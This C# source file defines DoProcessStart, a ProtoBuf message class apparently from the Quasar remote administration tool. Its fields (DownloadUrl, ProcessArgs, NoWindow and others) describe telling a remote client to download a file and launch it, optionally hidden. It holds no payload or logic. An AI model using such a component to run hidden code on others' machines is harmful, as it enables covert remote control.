using ProtoBuf;

namespace Quasar.Common.Messages
{
    [ProtoContract]
    public class DoProcessStart : IMessage
    {
        [ProtoMember(1)]
        public string TaskId { get; set; }

        [ProtoMember(2)]
        public string DownloadUrl { get; set; }

        [ProtoMember(3)]
        public string FilePath { get; set; }

        [ProtoMember(4)]
        public bool IsUpdate { get; set; }

        [ProtoMember(5)]
        public string DownloadDestPath { get; set; }

        [ProtoMember(6)]
        public string ProcessArgs { get; set; }

        [ProtoMember(7)]
        public bool UseShellExecute { get; set; }

        [ProtoMember(8)]
        public bool CaptureOutput { get; set; }

        [ProtoMember(9)]
        public bool NoWindow { get; set; }
    }
}
